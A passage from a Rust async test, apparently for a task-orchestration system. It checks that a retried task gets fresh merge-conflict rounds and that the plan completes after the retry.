    assert!(!decisions(&events(&core).await).iter().any(|d| d.1.contains("failed:")), "blocked for you, not failed work");

    // Retry gives new conflict rounds. Nothing else lands on shared.txt now, so t2 merges.
    core.move_task(&t.id, TaskStatus::Ready).await.unwrap();
    wait_plan(&core, PlanStatus::Done).await;
    assert_eq!(asked(), 4);
    let last = worker_prompts(&turns).into_iter().rfind(|p| p.contains(CONFLICT)).unwrap();
    assert!(last.contains("(round 1/3)"), "{last}");
    core.shutdown().await;
}
